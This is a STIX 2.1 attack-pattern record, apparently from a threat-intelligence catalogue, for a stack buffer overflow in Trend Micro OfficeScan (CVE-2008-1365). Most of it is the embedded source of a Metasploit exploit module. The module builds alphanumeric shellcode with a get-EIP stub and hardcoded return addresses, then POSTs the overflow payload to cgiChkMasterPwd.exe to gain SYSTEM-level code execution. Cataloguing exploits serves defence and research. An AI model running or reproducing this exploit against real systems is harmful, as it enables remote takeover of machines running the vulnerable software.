{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c0502e94-488e-4de8-8a20-79ede45e5f3e",
    "created": "2024-08-14T16:54:37.889089Z",
    "modified": "2024-08-14T16:54:37.889093Z",
    "name": "Trend Micro OfficeScan Remote Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Trend Micro OfficeScan cgiChkMasterPwd.exe (running with SYSTEM privileges). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/trendmicro_officescan.rb",
            "external_id": "trendmicro_officescan.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1365"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasm'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Trend Micro OfficeScan Remote Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Trend Micro OfficeScan\n        cgiChkMasterPwd.exe (running with SYSTEM privileges).\n      },\n      'Author'         => [ 'toto' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-1365' ],\n          [ 'OSVDB', '42499' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'MinNops'  => 0,\n          'MaxNops'  => 0,\n          #'Space'    => 498,\n          'BadChars' => Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),\n          # clean up to prevent crash on exit\n          'Prepend' => Metasm::Shellcode.assemble(Metasm::Ia32.new, \"mov dword ptr fs:[0], 0\").encode_string,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ECX',\n            },\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # return addresses need to be alphanumeric (here in loadhttp data section)\n          [ 'Windows 2000 - Trend Micro OfficeScan 7.3.0.1293)', { 'Rets' => [0x63613035, 0x63613032] } ],\n        ],\n      'DisclosureDate' => '2007-06-28',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n      ])\n  end\n\n  def exploit\n    geip_src = \"\n      push esi\n      push esp\n      pop eax\n      xor esi, [eax]\n      push esi\n      pop eax\n      xor eax, got_eip\n      push eax\n      pop ecx\n      got_eip:\n    \"\n\n    sc = Metasm::Shellcode.assemble(Metasm::Ia32.new, geip_src)\n\n    sc.base_addr = target['Rets'][0]\n    get_eip = sc.encode_string\n\n    pat = Rex::Text.rand_text_alphanumeric(1016)\n\n    pat[0, get_eip.length] = get_eip\n    pat[14, payload.encoded.length] = payload.encoded\n    pat[512, 4] = [target['Rets'][1]].pack('V')    # string pointer (to prevent a crash)\n    pat[524, 4] = [target['Rets'][0]].pack('V')    # sets EIP to the address where the shellcode has been copied\n    pat[540, 4] = [target['Rets'][0]-1].pack('V')  # shellcode will be copied at this address (+1)\n\n    data = \"TMlogonEncrypted=!CRYPT!\" + pat\n    len = sprintf(\"%u\", data.length);\n\n    print_status(\"Trying target address 0x%.8x...\" % target['Rets'][0])\n\n    res = send_request_cgi({\n      'uri'          => '/officescan/console/cgi/cgiChkMasterPwd.exe',\n      'method'       => 'POST',\n      'content-type' => 'application/x-www-form-urlencoded',\n      'data'         => data,\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-06-28",
    "x_mitre_platforms": [
        "win'"
    ]
}